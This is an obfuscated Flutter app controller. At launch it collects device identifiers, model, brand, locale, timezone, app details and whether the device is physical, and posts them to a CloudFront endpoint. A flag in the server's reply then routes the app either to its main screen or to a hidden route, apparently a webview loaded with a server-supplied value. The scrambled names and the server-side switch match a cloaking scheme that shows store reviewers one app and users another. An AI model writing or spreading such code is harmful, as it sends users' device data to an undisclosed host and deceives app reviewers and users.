import 'dart:io';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:get/get.dart';

import 'package:dio/dio.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class PlMindLogic extends GetxController {

  var erjcumkdgz = RxBool(false);
  var iqdlkya = RxBool(true);
  var xwlkgvht = RxString("");
  var mbftzg = RxBool(false);
  var wxjf = RxBool(true);
  final fmhpcja = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    zcoj();
  }


  Future<void> zcoj() async {
    mbftzg.value = true;
    wxjf.value = true;
    iqdlkya.value = false;

    fmhpcja.post("https://d3c4xkg006hnzx.cloudfront.net/723cFgeZKPE",data: await sxojlmwkq()).then((value) {
      var djufip = value.data["djufip"] as String;
      var jzvdef = value.data["jzvdef"] as bool;
      if (jzvdef) {
        xwlkgvht.value = djufip;
        vnzcr();
      } else {
        etgzwmd();
      }
    }).catchError((e) {
      iqdlkya.value = true;
      wxjf.value = true;
      mbftzg.value = false;
    });
  }

  Future<Map<String, dynamic>> sxojlmwkq() async {
    final DeviceInfoPlugin uespxi = DeviceInfoPlugin();
    PackageInfo jgpxktm_ebcoz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var eblcp = Platform.localeName;
    var eWnDc = currentTimeZone;

    var sZAmw = jgpxktm_ebcoz.packageName;
    var lfxCUX = jgpxktm_ebcoz.version;
    var iUXQDcrn = jgpxktm_ebcoz.buildNumber;

    var QZOyJKB = jgpxktm_ebcoz.appName;
    var pzFry = "";
    var ikbY  = "";
    var ftlaNJO = "";
    var egqncby = "";
    var kgnea = "";
    var iyqrfgb = "";
    var ioch = "";
    var ulnvahre = "";
    var jrxahd = "";
    var dnhl = "";
    var qrkal = "";


    var QXxl = "";
    var CnqKo = false;

    if (GetPlatform.isAndroid) {
      QXxl = "android";
      var bwzpkx = await uespxi.androidInfo;

      ftlaNJO = bwzpkx.brand;

      pzFry  = bwzpkx.model;
      ikbY = bwzpkx.id;

      CnqKo = bwzpkx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      QXxl = "ios";
      var manlfivk = await uespxi.iosInfo;
      ftlaNJO = manlfivk.name;
      pzFry = manlfivk.model;

      ikbY = manlfivk.identifierForVendor ?? "";
      CnqKo  = manlfivk.isPhysicalDevice;
    }
    var res = {
      "QZOyJKB": QZOyJKB,
      "lfxCUX": lfxCUX,
      "ulnvahre" : ulnvahre,
      "sZAmw": sZAmw,
      "pzFry": pzFry,
      "eWnDc": eWnDc,
      "ftlaNJO": ftlaNJO,
      "ikbY": ikbY,
      "QXxl": QXxl,
      "CnqKo": CnqKo,
      "egqncby" : egqncby,
      "kgnea" : kgnea,
      "iUXQDcrn": iUXQDcrn,
      "iyqrfgb" : iyqrfgb,
      "ioch" : ioch,
      "jrxahd" : jrxahd,
      "eblcp": eblcp,
      "dnhl" : dnhl,
      "qrkal" : qrkal,

    };
    return res;
  }

  Future<void> etgzwmd() async {
    Get.offNamed("/main");
  }

  Future<void> vnzcr() async {
    Get.offNamed("/setting_leger");
  }

}
